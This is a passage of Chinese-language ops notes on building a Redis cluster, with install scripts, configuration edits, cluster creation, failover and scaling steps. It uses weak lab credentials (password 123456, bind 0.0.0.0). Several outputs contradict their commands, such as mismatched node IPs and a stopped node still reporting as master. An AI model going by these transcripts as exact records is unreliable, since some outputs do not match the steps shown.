**验证 redis cluster访问**

```
#-c 表示以系统自动帮你重定向到对应的卡槽
[root@node5 ~]# redis-cli -a 123456 -c
Warning: Using a password with '-a' or '-u' option on the command line interface may not be safe.
127.0.0.1:6379> set name wang
-> Redirected to slot [5798] located at 10.0.0.17:6379
OK
10.0.0.17:6379> get name
"wang"
```

##### 45.4.7.4 基于Redis 5以上的redis cluster部署

**环境准备**

```
官方文档：https://redis.io/topics/cluster-tutorial

1. 每个redis节点采用相同的硬件配置、相同的密码、相同的redis版本。
2. 所有redis服务器必须没有任何数据。
3. 准备六台主机，地址如下：
10.0.0.7
10.0.0.17
10.0.0.27
10.0.0.37
10.0.0.47
10.0.0.57
```

**一键安装reids6.2.2脚本**

```
#!/bin/bash
#      
#********************************************************************
#Author:        liusenbiao
#Date:          2022-07-10
#FileName：     install_redis.sh
#Description：  通用脚本：在线一键编译安装Redis
#********************************************************************
SRC_DIR=/usr/local/src
COLOR="echo -e \\033[01;31m"
END='\033[0m'
CPUS=`lscpu |awk '/^CPU\(s\)/{print $2}'`

#URL='https://download.redis.io/releases/'
URL='http://liusenbiao.cn/download/tars/redis/'
REDIS_FILE=redis-6.2.2.tar.gz
VERSION=`echo $REDIS_FILE |awk -F"[-.]" '{print $2}'`
PASSWORD=123456
INSTALL_DIR=/apps/redis

rpm -q wget &> /dev/null || yum -y install wget
os(){
    if grep -Eqi "CentOS" /etc/issue || grep -Eq "CentOS" /etc/*-release;then
        rpm -q redhat-lsb-core &> /dev/null || { ${COLOR}"安装lsb_release工具"${END};yum -y install  redhat-lsb-core &> /dev/null; }
    fi
    OS_ID=`lsb_release -is`
}

check_file (){
    cd ${SRC_DIR}
    rpm -q wget &> /dev/null || yum -y install wget &> /dev/null
    if [ ! -e ${REDIS_FILE} ];then
        ${COLOR}"缺少${REDIS_FILE}文件"${END}
        ${COLOR}'开始下载REDIS源码包'${END}
        wget ${URL}${REDIS_FILE} || { ${COLOR}"Redis 源码下载失败"${END}; exit; } 
    else
        ${COLOR}"相关文件已准备好"${END}
    fi
}

install(){
    [ -d ${INSTALL_DIR} ] && { ${COLOR}"Redis已存在，安装失败"${END};exit; }
    ${COLOR}"开始安装REDIS"${END}
    ${COLOR}"开始安装REDIS依赖包"${END}
    if [ ${VERSION} == "6" ] ;then
        if [ ${OS_ID} == "CentOS" ] &> /dev/null;then
            yum  -y install gcc jemalloc-devel systemd-devel &> /dev/null || { ${COLOR}"安装软件包失败，请检查网络配置"${END}; exit; }
        else
            apt -y install make gcc libjemalloc-dev libsystemd-dev &> /dev/null  || { ${COLOR}"安装软件包失败，请检查网络配置"${END}; exit; }
        fi
    else
         if [ ${OS_ID} == "CentOS" ] &> /dev/null;then
            yum  -y install gcc jemalloc-devel &> /dev/null || { ${COLOR}"安装软件包失败，请检查网络配置"${END}; exit; }
        else
            apt -y install make gcc libjemalloc-dev &> /dev/null  || { ${COLOR}"安装软件包失败，请检查网络配置"${END}; exit; }
        fi
    fi
    cd ${SRC_DIR}
    tar xf ${REDIS_FILE}
    REDIS_DIR=`echo ${REDIS_FILE} | sed -nr 's/^(.*[0-9]).*/\1/p'`
    cd ${REDIS_DIR}
    if [ ${VERSION} == "6" ] ;then
        make -j ${CPUS} USE_SYSTEMD=yes PREFIX=${INSTALL_DIR} install && ${COLOR}"Redis 编译安装完成"${END} || { ${COLOR}"Redis 编译安装失败"${END};exit ; }
    else
        make -j ${CPUS} PREFIX=${INSTALL_DIR} install && ${COLOR}"Redis 编译安装完成"${END} || { ${COLOR}"Redis 编译安装失败"${END};exit ; }
    fi
    ln -s ${INSTALL_DIR}/bin/redis-*  /usr/bin/
    mkdir -p ${INSTALL_DIR}/{etc,log,data,run}
    cp redis.conf  ${INSTALL_DIR}/etc/
    sed -i -e 's/bind 127.0.0.1.*/bind 0.0.0.0/'  -e "/# requirepass/a requirepass ${PASSWORD}"  -e "/^dir .*/c dir ${INSTALL_DIR}/data/"  -e "/logfile .*/c logfile ${INSTALL_DIR}/log/redis-6379.log"  -e  "/^pidfile .*/c  pidfile ${INSTALL_DIR}/run/redis_6379.pid" ${INSTALL_DIR}/etc/redis.conf

    if id redis &> /dev/null ;then
        ${COLOR}"Redis 用户已存在"${END}
    else
        useradd -r -s /sbin/nologin redis
        ${COLOR}"Redis 用户创建成功"${END}
    fi

    chown -R redis.redis ${INSTALL_DIR}
    cat >> /etc/sysctl.conf <<-EOF
net.core.somaxconn = 1024
vm.overcommit_memory = 1
EOF
    sysctl -p
    if [ ${OS_ID} == "CentOS" ] &> /dev/null;then
        echo 'echo never > /sys/kernel/mm/transparent_hugepage/enabled' >> /etc/rc.d/rc.local
        chmod +x /etc/rc.d/rc.local
    else
        cat >> /lib/systemd/system/rc-local.service <<-EOF

[Install]
WantedBy=multi-user.target
EOF
        echo '#!/bin/bash' > /etc/rc.local
        echo 'echo never > /sys/kernel/mm/transparent_hugepage/enabled' >> /etc/rc.local
        chmod +x /etc/rc.local
    fi
    
    cat > /lib/systemd/system/redis.service <<-EOF
[Unit]
Description=Redis persistent key-value database
After=network.target

[Service]
ExecStart=${INSTALL_DIR}/bin/redis-server ${INSTALL_DIR}/etc/redis.conf --supervised systemd
ExecReload=/bin/kill -s HUP \$MAINPID
ExecStop=/bin/kill -s QUIT \$MAINPID
Type=notify
User=redis
Group=redis
RuntimeDirectory=redis
RuntimeDirectoryMode=0755

[Install]
WantedBy=multi-user.target
EOF
    systemctl daemon-reload
    systemctl enable --now  redis &> /dev/null 
    systemctl is-active redis &> /dev/null && ${COLOR}"Redis 服务启动成功,Redis信息如下:"${END} || { ${COLOR}"Redis 启动失败"${END};exit; }
    redis-cli -a ${PASSWORD} info server 2> /dev/null
    ${COLOR}"亲亲~Redis安装完成"${END}
}

main(){
    os
    check_file
    install
}

main
```

**在所有节点启动cluster功能**

```
#1.手动修改配置文件
[root@node1 ~]# vim /apps/redis/etc/redis.conf
bind 0.0.0.0
masterauth 123456
requirepass 123456
cluster-enabled yes #取消此行注释，必须开启集群，开启后redis，进程会有cluster标识
cluster-config-file nodes-6379.conf #取消此行注释，此为集群状态文件记录主从关系以及slot范围信息,由redis cluster集群自动创建和维护
cluster-require-full-coverage no #默认为yes,设为no可以防止一个节点不可用导致整个cluster不可用。



#2.非交互
[root@node1 ~]# sed -i.bak -e 's/bind 127.0.0.1/bind 0.0.0.0/' -e '/masterauth/a masterauth 123456' -e '/# cluster-enabled yes/a cluster-enabled yes' -e '/# cluster-config-file nodes-6379.conf/a cluster-config-file nodes-6379.conf' -e '/cluster-require-full-coverage yes/c cluster-require-full-coverage no' /apps/redis/etc/redis.conf 



#3.重启服务
[root@node1 ~]# systemctl restart redis
[root@node1 ~]# ps aux |grep redis
redis     16130  0.1  0.2 195544 10868 ?        Ssl  15:54   0:00 /apps/redis/bin/redis-server 0.0.0.0:6379 [cluster]   #工作在集群模式下了
root      16139  0.0  0.0 112808   968 pts/0    R+   15:58   0:00 grep --color=auto redis
```

**验证当前Redis服务状态：**

```
#开启了16379的cluster的端口,实际的端口=redis port + 10000
[root@node1 ~]# ss -ntl
State       Recv-Q       Send-Q Local    Address:Port     Peer Address:Port 
       
LISTEN       0             128           0.0.0.0:22            0.0.0.0:*     
      
LISTEN       0             100           127.0.0.1:25          0.0.0.0:*     
      
LISTEN       0             128           0.0.0.0:16379         0.0.0.0:*     
      
LISTEN       0             128           0.0.0.0:6379          0.0.0.0:*     
      
LISTEN       0             128             [::]:22             [::]:*     
      
LISTEN       0             100             [::1]:25            [::]:*     
     
```

 **创建集群**

```
#1.redis-cli --cluster-replicas 1 表示每个master对应一个slave节点
[root@node1 ~]# redis-cli -a 123456 --cluster create 10.0.0.7:6379 10.0.0.17:6379 10.0.0.27:6379 10.0.0.37:6379 10.0.0.47:6379 10.0.0.57:6379 --cluster-replicas 1
Warning: Using a password with '-a' or '-u' option on the command line interface may not be safe.
>>> Performing hash slots allocation on 6 nodes...
Master[0] -> Slots 0 - 5460
Master[1] -> Slots 5461 - 10922
Master[2] -> Slots 10923 - 16383
Adding replica 10.0.0.47:6379 to 10.0.0.7:6379
Adding replica 10.0.0.67:6379 to 10.0.0.17:6379
Adding replica 10.0.0.37:6379 to 10.0.0.27:6379
M: 91af5cf25100961d1127c9e048eb905a0d61cbe8 10.0.0.7:6379
   slots:[0-5460] (5461 slots) master
M: 1fd4b9d6011cd41e060541de10fd890d14b65b3c 10.0.0.17:6379
   slots:[5461-10922] (5462 slots) master
M: ef63cee4152858fab7560aab6fd181966d340232 10.0.0.27:6379
   slots:[10923-16383] (5461 slots) master
S: 203a91a24fee186eff4001771d2c4b80958ad326 10.0.0.37:6379
   replicates ef63cee4152858fab7560aab6fd181966d340232
S: 9e7abb0c0841e5e4fc953dd59041d3db49566e1b 10.0.0.47:6379
   replicates 91af5cf25100961d1127c9e048eb905a0d61cbe8
S: 8514d50c26b2a9454f07596057dbb31d10e7c996 10.0.0.67:6379
   replicates 1fd4b9d6011cd41e060541de10fd890d14b65b3c 
Can I set the above configuration? (type 'yes' to accept): yes    #无脑输入yes
>>> Nodes configuration updated
>>> Assign a different config epoch to each node
>>> Sending CLUSTER MEET messages to join the cluster
Waiting for the cluster to join
...
>>> Performing Cluster Check (using node 10.0.0.7:6379)
M: 91af5cf25100961d1127c9e048eb905a0d61cbe8 10.0.0.7:6379
   slots:[0-5460] (5461 slots) master
   1 additional replica(s)
M: 1fd4b9d6011cd41e060541de10fd890d14b65b3c 10.0.0.17:6379
   slots:[5461-10922] (5462 slots) master
   1 additional replica(s)
S: 8514d50c26b2a9454f07596057dbb31d10e7c996 10.0.0.67:6379
   slots: (0 slots) slave
   replicates 1fd4b9d6011cd41e060541de10fd890d14b65b3c
S: 9e7abb0c0841e5e4fc953dd59041d3db49566e1b 10.0.0.47:6379
   slots: (0 slots) slave
   replicates 91af5cf25100961d1127c9e048eb905a0d61cbe8
M: ef63cee4152858fab7560aab6fd181966d340232 10.0.0.27:6379
   slots:[10923-16383] (5461 slots) master
   1 additional replica(s)
S: 203a91a24fee186eff4001771d2c4b80958ad326 10.0.0.37:6379
   slots: (0 slots) slave
   replicates ef63cee4152858fab7560aab6fd181966d340232
[OK] All nodes agree about slots configuration.
>>> Check for open slots...
>>> Check slots coverage...
[OK] All 16384 slots covered.






#2.验证集群
[root@node1 ~]# redis-cli -a 123456 cluster info
Warning: Using a password with '-a' or '-u' option on the command line interface may not be safe.
cluster_state:ok
cluster_slots_assigned:16384
cluster_slots_ok:16384
cluster_slots_pfail:0
cluster_slots_fail:0
cluster_known_nodes:6
cluster_size:3   #3组集群搭建成功！！！
cluster_current_epoch:6
cluster_my_epoch:1
cluster_stats_messages_ping_sent:163
cluster_stats_messages_pong_sent:147
cluster_stats_messages_sent:310
cluster_stats_messages_ping_received:142
cluster_stats_messages_pong_received:163
cluster_stats_messages_meet_received:5
cluster_stats_messages_received:310





#3.查看任意节点的集群状态
[root@redis-node1 ~]#redis-cli -a 123456 --cluster info 10.0.0.37:6379
[root@node1 ~]# redis-cli -a 123456 --cluster info 10.0.0.37:6379
Warning: Using a password with '-a' or '-u' option on the command line interface may not be safe.
10.0.0.27:6379 (ef63cee4...) -> 0 keys | 5461 slots | 1 slaves.
10.0.0.17:6379 (1fd4b9d6...) -> 0 keys | 5462 slots | 1 slaves.
10.0.0.7:6379 (91af5cf2...) -> 0 keys | 5461 slots | 1 slaves.
[OK] 0 keys in 3 masters.
0.00 keys per slot on average.
```

**验证集群写入key**

![1658371391810](linux体系.assets/1658371391810.png)

**python脚本实现RedisCluster集群写入**

```
#1.编写python脚本实现集群写入
[root@node1 ~]# yum -y install python3;pip3 install redis-py-cluster;
[root@node1 ~]# vim redis_cluster_test.py 
#:%s/8/7/g:把所有的8替换成7
#!/usr/bin/env python3
from rediscluster  import RedisCluster

if __name__ == '__main__':

    startup_nodes = [
        {"host":"10.0.0.7", "port":6379},
        {"host":"10.0.0.17", "port":6379},
        {"host":"10.0.0.27", "port":6379},
        {"host":"10.0.0.37", "port":6379},
        {"host":"10.0.0.47", "port":6379},
        {"host":"10.0.0.57", "port":6379}]
    try:
        redis_conn= RedisCluster(startup_nodes=startup_nodes,password='123456', decode_responses=True)
    except Exception as e:
        print(e)

    for i in range(0, 10000):
        redis_conn.set('key'+str(i),'value'+str(i))
        print('key'+str(i)+':',redis_conn.get('key'+str(i)))
        
[root@node1 ~]# chmod +x redis_cluster_test.py
[root@node1 ~]# ./redis_cluster_test.py




#2.查看redis集群情况
[root@redis-node1 ~]#redis-cli -a 123456 -h 10.0.0.7
Warning: Using a password with '-a' or '-u' option on the command line interface
may not be safe.
10.0.0.8:6379> DBSIZE
(integer) 3331
10.0.0.8:6379> GET key1
(error) MOVED 9189 10.0.0.18:6379
10.0.0.8:6379> GET key2
"value2"
10.0.0.8:6379> GET key3
"value3"
10.0.0.8:6379> KEYS *
......
3329) "key7832"
3330) "key2325"
3331) "key2880"
```

**模拟master故障，对应的slave节点自动提升为新master**

```
[root@node1 ~]# systemctl stop redis  #挂掉node1的服务
[root@node1 ~]# redis-cli -a 123456 info replication
Warning: Using a password with '-a' or '-u' option on the command line interface may not be safe.
# Replication
role:master
connected_slaves:1   #node1的从节点是10.0.0.47
slave0:ip=10.0.0.47,port=6379,state=online,offset=138600,lag=1
master_failover_state:no-failover
master_replid:2ecb8a410c9b5c63bd6dd5d451ff78a31405e7f4
master_replid2:0000000000000000000000000000000000000000
master_repl_offset:138600
second_repl_offset:-1
repl_backlog_active:1
repl_backlog_size:1048576
repl_backlog_first_byte_offset:1
repl_backlog_histlen:138600




#查看10.0.0.47上redis的状态
# systemctl stop redis后
[root@node5 ~]# redis-cli -a 123456 info replication
Warning: Using a password with '-a' or '-u' option on the command line interface may not be safe.
# Replication
role:master    #从节点自动变成主节点！！！
connected_slaves:0
master_failover_state:no-failover
master_replid:8263b310b4d4b9ad49f6da0f8de7ee23115332e2
master_replid2:2ecb8a410c9b5c63bd6dd5d451ff78a31405e7f4
master_repl_offset:138824
second_repl_offset:138825
repl_backlog_active:1
repl_backlog_size:1048576
repl_backlog_first_byte_offset:1
repl_backlog_histlen:138824


#systemctl restart redis后
[root@node5 ~]# redis-cli -a 123456 info replication
Warning: Using a password with '-a' or '-u' option on the command line interface may not be safe.
# Replication
role:master
connected_slaves:1  #10.0.0.7变成了从节点！！！
slave0:ip=10.0.0.7,port=6379,state=online,offset=138824,lag=1
master_failover_state:no-failover
master_replid:8263b310b4d4b9ad49f6da0f8de7ee23115332e2
master_replid2:2ecb8a410c9b5c63bd6dd5d451ff78a31405e7f4
master_repl_offset:138824
second_repl_offset:138825
repl_backlog_active:1
repl_backlog_size:1048576
repl_backlog_first_byte_offset:1
repl_backlog_histlen:138824



[root@node2 ~]# redis-cli -a 123456 cluster nodes
Warning: Using a password with '-a' or '-u' option on the command line interface may not be safe.
8514d50c26b2a9454f07596057dbb31d10e7c996 10.0.0.67:6379@16379 slave 1fd4b9d6011cd41e060541de10fd890d14b65b3c 0 1658373288612 2 connected
1fd4b9d6011cd41e060541de10fd890d14b65b3c 10.0.0.17:6379@16379 myself,master - 0 1658373285000 2 connected 5461-10922
203a91a24fee186eff4001771d2c4b80958ad326 10.0.0.37:6379@16379 slave ef63cee4152858fab7560aab6fd181966d340232 0 1658373284576 3 connected
9e7abb0c0841e5e4fc953dd59041d3db49566e1b 10.0.0.47:6379@16379 master - 0 1658373286000 7 connected 0-5460  10.0.0.47变成master
91af5cf25100961d1127c9e048eb905a0d61cbe8 10.0.0.7:6379@16379 slave 9e7abb0c0841e5e4fc953dd59041d3db49566e1b 0 1658373287604 7 connected
ef63cee4152858fab7560aab6fd181966d340232 10.0.0.27:6379@16379 master - 0 1658373287000 3 connected 10923-16383
```

##### 45.4.7.5 基于Redis 4以上的redis cluster部署

**一键安装reids4.0.14脚本**

```
#!/bin/bash
#      
#********************************************************************
#Author:        liusenbiao
#Date:          2022-07-10
#FileName：     install_redis.sh
#Description：  通用脚本：在线一键编译安装Redis
#********************************************************************
SRC_DIR=/usr/local/src
COLOR="echo -e \\033[01;31m"
END='\033[0m'
CPUS=`lscpu |awk '/^CPU\(s\)/{print $2}'`

#URL='https://download.redis.io/releases/'
URL='http://liusenbiao.cn/download/tars/redis/'
REDIS_FILE=redis-4.0.14.tar.gz
VERSION=`echo $REDIS_FILE |awk -F"[-.]" '{print $2}'`
PASSWORD=123456
INSTALL_DIR=/apps/redis

rpm -q wget &> /dev/null || yum -y install wget
os(){
    if grep -Eqi "CentOS" /etc/issue || grep -Eq "CentOS" /etc/*-release;then
        rpm -q redhat-lsb-core &> /dev/null || { ${COLOR}"安装lsb_release工具"${END};yum -y install  redhat-lsb-core &> /dev/null; }
    fi
    OS_ID=`lsb_release -is`
}

check_file (){
    cd ${SRC_DIR}
    rpm -q wget &> /dev/null || yum -y install wget &> /dev/null
    if [ ! -e ${REDIS_FILE} ];then
        ${COLOR}"缺少${REDIS_FILE}文件"${END}
        ${COLOR}'开始下载REDIS源码包'${END}
        wget ${URL}${REDIS_FILE} || { ${COLOR}"Redis 源码下载失败"${END}; exit; } 
    else
        ${COLOR}"相关文件已准备好"${END}
    fi
}

install(){
    [ -d ${INSTALL_DIR} ] && { ${COLOR}"Redis已存在，安装失败"${END};exit; }
    ${COLOR}"开始安装REDIS"${END}
    ${COLOR}"开始安装REDIS依赖包"${END}
    if [ ${VERSION} == "6" ] ;then
        if [ ${OS_ID} == "CentOS" ] &> /dev/null;then
            yum  -y install gcc jemalloc-devel systemd-devel &> /dev/null || { ${COLOR}"安装软件包失败，请检查网络配置"${END}; exit; }
        else
            apt -y install make gcc libjemalloc-dev libsystemd-dev &> /dev/null  || { ${COLOR}"安装软件包失败，请检查网络配置"${END}; exit; }
        fi
    else
         if [ ${OS_ID} == "CentOS" ] &> /dev/null;then
            yum  -y install gcc jemalloc-devel &> /dev/null || { ${COLOR}"安装软件包失败，请检查网络配置"${END}; exit; }
        else
            apt -y install make gcc libjemalloc-dev &> /dev/null  || { ${COLOR}"安装软件包失败，请检查网络配置"${END}; exit; }
        fi
    fi
    cd ${SRC_DIR}
    tar xf ${REDIS_FILE}
    REDIS_DIR=`echo ${REDIS_FILE} | sed -nr 's/^(.*[0-9]).*/\1/p'`
    cd ${REDIS_DIR}
    if [ ${VERSION} == "6" ] ;then
        make -j ${CPUS} USE_SYSTEMD=yes PREFIX=${INSTALL_DIR} install && ${COLOR}"Redis 编译安装完成"${END} || { ${COLOR}"Redis 编译安装失败"${END};exit ; }
    else
        make -j ${CPUS} PREFIX=${INSTALL_DIR} install && ${COLOR}"Redis 编译安装完成"${END} || { ${COLOR}"Redis 编译安装失败"${END};exit ; }
    fi
    ln -s ${INSTALL_DIR}/bin/redis-*  /usr/bin/
    mkdir -p ${INSTALL_DIR}/{etc,log,data,run}
    cp redis.conf  ${INSTALL_DIR}/etc/
    sed -i -e 's/bind 127.0.0.1.*/bind 0.0.0.0/'  -e "/# requirepass/a requirepass ${PASSWORD}"  -e "/^dir .*/c dir ${INSTALL_DIR}/data/"  -e "/logfile .*/c logfile ${INSTALL_DIR}/log/redis-6379.log"  -e  "/^pidfile .*/c  pidfile ${INSTALL_DIR}/run/redis_6379.pid" ${INSTALL_DIR}/etc/redis.conf

    if id redis &> /dev/null ;then
        ${COLOR}"Redis 用户已存在"${END}
    else
        useradd -r -s /sbin/nologin redis
        ${COLOR}"Redis 用户创建成功"${END}
    fi

    chown -R redis.redis ${INSTALL_DIR}
    cat >> /etc/sysctl.conf <<-EOF
net.core.somaxconn = 1024
vm.overcommit_memory = 1
EOF
    sysctl -p
    if [ ${OS_ID} == "CentOS" ] &> /dev/null;then
        echo 'echo never > /sys/kernel/mm/transparent_hugepage/enabled' >> /etc/rc.d/rc.local
        chmod +x /etc/rc.d/rc.local
    else
        cat >> /lib/systemd/system/rc-local.service <<-EOF

[Install]
WantedBy=multi-user.target
EOF
        echo '#!/bin/bash' > /etc/rc.local
        echo 'echo never > /sys/kernel/mm/transparent_hugepage/enabled' >> /etc/rc.local
        chmod +x /etc/rc.local
    fi
    
    cat > /lib/systemd/system/redis.service <<-EOF
[Unit]
Description=Redis persistent key-value database
After=network.target

[Service]
ExecStart=${INSTALL_DIR}/bin/redis-server ${INSTALL_DIR}/etc/redis.conf --supervised systemd
ExecReload=/bin/kill -s HUP \$MAINPID
ExecStop=/bin/kill -s QUIT \$MAINPID
Type=notify
User=redis
Group=redis
RuntimeDirectory=redis
RuntimeDirectoryMode=0755

[Install]
WantedBy=multi-user.target
EOF
    systemctl daemon-reload
    systemctl enable --now  redis &> /dev/null 
    systemctl is-active redis &> /dev/null && ${COLOR}"Redis 服务启动成功,Redis信息如下:"${END} || { ${COLOR}"Redis 启动失败"${END};exit; }
    redis-cli -a ${PASSWORD} info server 2> /dev/null
    ${COLOR}"亲亲~Redis安装完成"${END}
}

main(){
    os
    check_file
    install
}

main
```

**在所有节点启动cluster功能**

```
#1.手动修改配置文件
[root@node1 ~]# vim /apps/redis/etc/redis.conf
bind 0.0.0.0
masterauth 123456
requirepass 123456
cluster-enabled yes #取消此行注释，必须开启集群，开启后redis，进程会有cluster标识
cluster-config-file nodes-6379.conf #取消此行注释，此为集群状态文件记录主从关系以及slot范围信息,由redis cluster集群自动创建和维护
cluster-require-full-coverage no #默认为yes,设为no可以防止一个节点不可用导致整个cluster不可用。



#2.非交互
[root@node1 ~]# sed -i.bak -e 's/bind 127.0.0.1/bind 0.0.0.0/' -e '/masterauth/a masterauth 123456' -e '/# cluster-enabled yes/a cluster-enabled yes' -e '/# cluster-config-file nodes-6379.conf/a cluster-config-file nodes-6379.conf' -e '/cluster-require-full-coverage yes/c cluster-require-full-coverage no' /apps/redis/etc/redis.conf 



#3.重启服务
[root@node1 ~]# systemctl restart redis
[root@node1 ~]# ps aux |grep redis
redis     16130  0.1  0.2 195544 10868 ?        Ssl  15:54   0:00 /apps/redis/bin/redis-server 0.0.0.0:6379 [cluster]   #工作在集群模式下了
root      16139  0.0  0.0 112808   968 pts/0    R+   15:58   0:00 grep --color=auto redis
```

**编译安装安装ruby**

```
#1.概述
Redis 3和 4版本需要使用到集群管理工具redis-trib.rb，这个工具是redis官方推出的管理redis集群的工具，集成在redis的源码src目录下，是基于redis提供的集群命令封装成简单、便捷、实用的操作工具，redis-trib.rb是redis作者用ruby开发完成的，centos 7系统yum安装的ruby存在版本较低问题。





#2.安装ruby
[root@node1 ~]# yum -y install gcc openssl-devel zlib-devel
[root@node1 ~]# wget https://cache.ruby-lang.org/pub/ruby/2.5/ruby-2.5.5.tar.gz
[root@node1 ~]# tar xf ruby-2.5.5.tar.gz
[root@node1 ~]# cd ruby-2.5.5
[root@node1 ruby-2.5.5]# ./configure
[root@node1 ruby-2.5.5]# make -j 2 && make install
[root@node1 ruby-2.5.5]# ruby -v
ruby 2.5.5p157 (2019-03-15 revision 67260) [x86_64-linux]
[root@node1 ~]# exit


#安装redis相关模块
[root@node1 ~]# gem install redis -v 4.1.3
Fetching: redis-4.1.3.gem (100%)
Successfully installed redis-4.1.3
Parsing documentation for redis-4.1.3
Installing ri documentation for redis-4.1.3
Done installing documentation for redis after 1 seconds
1 gem installed
```

**修改密码 redis 登录密码**

```
#修改redis-trib.rb连接redis的密码
[root@node1 src]# vim /usr/local/lib/ruby/gems/2.5.0/gems/redis-4.1.3/lib/redis/client.rb
```

![1658377370906](linux体系.assets/1658377370906.png)

**创建redis cluster集群**

```
[root@node1 ~]# ln -s /usr/local/src/redis-4.0.14/src/redis-trib.rb /usr/bin/


#创建集群
[root@node1 ~]# redis-trib.rb  create --replicas 1 10.0.0.7:6379 10.0.0.17:6379 10.0.0.27:6379 10.0.0.37:6379 10.0.0.47:6379 10.0.0.67:6379
>>> Creating cluster
>>> Performing hash slots allocation on 6 nodes...
Using 3 masters:
10.0.0.7:6379
10.0.0.17:6379
10.0.0.27:6379
Adding replica 10.0.0.47:6379 to 10.0.0.7:6379
Adding replica 10.0.0.67:6379 to 10.0.0.17:6379
Adding replica 10.0.0.37:6379 to 10.0.0.27:6379
M: 972250313a92ef3d30ee2cbb9b154d01c0efeffc 10.0.0.7:6379
   slots:0-5460 (5461 slots) master
M: 1903ccba4a5fa3b97915b51e8627b955459de285 10.0.0.17:6379
   slots:5461-10922 (5462 slots) master
M: 4f2507a5a92aaf92ab8e6b34c85ec8d0b30df01e 10.0.0.27:6379
   slots:10923-16383 (5461 slots) master
S: 2ecd1541d54452e93430b017d18b18ae514d72d4 10.0.0.37:6379
   replicates 4f2507a5a92aaf92ab8e6b34c85ec8d0b30df01e
S: fa610b1c96b8a654e18b63864ae8832f78318c06 10.0.0.47:6379
   replicates 972250313a92ef3d30ee2cbb9b154d01c0efeffc
S: 70288863dbab53804024638282004502bdcd71c5 10.0.0.67:6379
   replicates 1903ccba4a5fa3b97915b51e8627b955459de285
Can I set the above configuration? (type 'yes' to accept): yes   #无脑yes!!!
>>> Nodes configuration updated
>>> Assign a different config epoch to each node
>>> Sending CLUSTER MEET messages to join the cluster
Waiting for the cluster to join..
>>> Performing Cluster Check (using node 10.0.0.7:6379)
M: 972250313a92ef3d30ee2cbb9b154d01c0efeffc 10.0.0.7:6379
   slots:0-5460 (5461 slots) master
   1 additional replica(s)
M: 4f2507a5a92aaf92ab8e6b34c85ec8d0b30df01e 10.0.0.27:6379
   slots:10923-16383 (5461 slots) master
   1 additional replica(s)
S: 2ecd1541d54452e93430b017d18b18ae514d72d4 10.0.0.37:6379
   slots: (0 slots) slave
   replicates 4f2507a5a92aaf92ab8e6b34c85ec8d0b30df01e
M: 1903ccba4a5fa3b97915b51e8627b955459de285 10.0.0.17:6379
   slots:5461-10922 (5462 slots) master
   1 additional replica(s)
S: fa610b1c96b8a654e18b63864ae8832f78318c06 10.0.0.47:6379
   slots: (0 slots) slave
   replicates 972250313a92ef3d30ee2cbb9b154d01c0efeffc
S: 70288863dbab53804024638282004502bdcd71c5 10.0.0.67:6379
   slots: (0 slots) slave
   replicates 1903ccba4a5fa3b97915b51e8627b955459de285
[OK] All nodes agree about slots configuration.
>>> Check for open slots...
>>> Check slots coverage...
[OK] All 16384 slots covered.
```

**查看节点主从状态**

```
[root@node1 ~]# redis-trib.rb check 10.0.0.7:6379
>>> Performing Cluster Check (using node 10.0.0.7:6379)
M: 972250313a92ef3d30ee2cbb9b154d01c0efeffc 10.0.0.7:6379
   slots:0-5460 (5461 slots) master
   1 additional replica(s)
M: 4f2507a5a92aaf92ab8e6b34c85ec8d0b30df01e 10.0.0.27:6379
   slots:10923-16383 (5461 slots) master
   1 additional replica(s)
S: 2ecd1541d54452e93430b017d18b18ae514d72d4 10.0.0.37:6379
   slots: (0 slots) slave
   replicates 4f2507a5a92aaf92ab8e6b34c85ec8d0b30df01e
M: 1903ccba4a5fa3b97915b51e8627b955459de285 10.0.0.17:6379
   slots:5461-10922 (5462 slots) master
   1 additional replica(s)
S: fa610b1c96b8a654e18b63864ae8832f78318c06 10.0.0.47:6379
   slots: (0 slots) slave
   replicates 972250313a92ef3d30ee2cbb9b154d01c0efeffc
S: 70288863dbab53804024638282004502bdcd71c5 10.0.0.67:6379
   slots: (0 slots) slave
   replicates 1903ccba4a5fa3b97915b51e8627b955459de285
[OK] All nodes agree about slots configuration.
>>> Check for open slots...
>>> Check slots coverage...
[OK] All 16384 slots covered.
```

##### 45.4.7.6 Redis集群动态扩容

**生产案例：**

```
因公司业务发展迅猛，现有的三主三从的redis cluster架构可能无法满足现有业务的并发写入需求，因此公司紧急采购两台服务器10.0.0.68，10.0.0.78，需要将其动态添加到集群当中，但不能影响业务使用和数据丢失。

注意: 生产环境一般建议master节点为奇数个,比如:3,5,7,以防止脑裂现象
```

**添加节点准备**

```
#增加Redis node节点，需要与之前的Redis node版本相同、配置一致，然后分别再启动两台Redis node，应为一主一从。
#配置node7节点
#执行一键编译redis脚本
[root@node7 ~]# sed -i.bak -e 's/bind 127.0.0.1/bind 0.0.0.0/' -e '/masterauth/a masterauth 123456' -e '/# cluster-enabled yes/a cluster-enabled yes' -e '/# cluster-config-file nodes-6379.conf/a cluster-config-file nodes-6379.conf' -e '/cluster-require-full-coverage yes/c cluster-require-full-coverage no' /apps/redis/etc/redis.conf 
[root@node7 ~]# systemctl restart redis




#配置node8节点
#执行一键编译redis脚本
[root@node8 ~]# sed -i.bak -e 's/bind 127.0.0.1/bind 0.0.0.0/' -e '/masterauth/a masterauth 123456' -e '/# cluster-enabled yes/a cluster-enabled yes' -e '/# cluster-config-file nodes-6379.conf/a cluster-config-file nodes-6379.conf' -e '/cluster-require-full-coverage yes/c cluster-require-full-coverage no' /apps/redis/etc/redis.conf 
[root@node8 ~]# systemctl restart redis
```

**添加新的master节点到集群**

```
#1.命令参数
#使用以下命令添加新节点，要添加的新redis节点IP和端口添加到的已有的集群中任意节点的IP:端口
add-node new_host:new_port existing_host:existing_port [--slave --master-id<arg>]

#说明：
new_host:new_port #为新添加的主机的IP和端口
existing_host:existing_port #为已有的集群中任意节点的IP和端口




#2.redis 3.x或者4.x版本的添加方式
#把新的Redis 节点10.0.0.77添加到当前Redis集群当中。
[root@redis-node1 ~]#redis-trib.rb add-node 10.0.0.77:6379 10.0.0.37:6379
[root@redis-node1 ~]#redis-trib.rb info 10.0.0.7:6379
10.0.0.7:6379 (29a83275...) -> 3331 keys | 5461 slots | 1 slaves.
10.0.0.37:6379 (12ca273a...) -> 0 keys | 0 slots | 0 slaves.
10.0.0.27:6379 (90b20613...) -> 3329 keys | 5461 slots | 1 slaves.
10.0.0.17:6379 (fb34c3a7...) -> 3340 keys | 5462 slots | 1 slaves.
[OK] 10000 keys in 4 masters.
0.61 keys per slot on average.




#redis 5.x向上版本
